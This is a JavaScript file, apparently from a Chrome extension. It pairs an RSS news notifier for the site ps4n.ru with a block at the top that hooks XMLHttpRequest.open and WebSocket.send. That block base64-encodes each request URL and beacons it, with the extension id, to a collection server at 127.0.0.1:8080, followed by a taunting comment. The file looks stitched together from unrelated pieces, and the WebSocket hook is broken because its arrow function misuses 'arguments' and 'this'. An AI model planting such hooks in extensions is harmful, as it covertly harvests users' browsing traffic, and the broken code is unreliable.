function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function Update() {
				var xml = $.ajax({
					url: "http://ps4n.ru/feed/",
					dataType: "xml",
					success: function(xml) {
						i = 0; a = new Array(); n = 0;
						$(xml).find("item").each(function() {
							if (i < 10) { 
								a[0] = $(this).find("pubDate").text();
								var date1 = new Date(a[0]);
								var date2 = new Date(localStorage["lastDate"]);
								if ((date1 - date2) > 0) {
									n++;
								};
								a[1] = $(this).find("pubDate").next().text();
								a[2] = $(this).find("title").text();
								a[3] = $(this).find("guid").text();
								localStorage["n"+i] = JSON.stringify(a);
							};
							i++;
						});
						if (n > 0) {
							chrome.browserAction.setBadgeText({'text': n.toString()});
						};
					}
				});
};

function Notification() {
	var noti = webkitNotifications.createNotification(
		'128.png',  // icon url - can be relative
		'Новости!',  // notification title
		'Доступен новый материал'
	);
	noti.show();
	setTimeout(function() {noti.cancel()}, 5000);
};